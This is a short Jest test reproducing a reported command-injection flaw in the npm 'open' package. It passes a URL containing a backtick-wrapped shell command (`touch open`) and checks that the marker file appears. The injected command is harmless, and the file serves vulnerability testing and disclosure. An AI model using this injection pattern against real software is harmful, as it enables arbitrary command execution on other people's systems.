//https://hackerone.com/reports/319473
test("Command Injection in open", () => 
{
    const fs = require('fs');
	const path = './open';
	const sleep = require('sleep');
	
	//checking that its not present already
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(false);
    
    require("open")("http://example.com/`touch open`");

	sleep.sleep(5);
	//checking that its created by after exploit.
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(true);

	fs.unlink(path, function(err) {});//deleting the file after creation
});
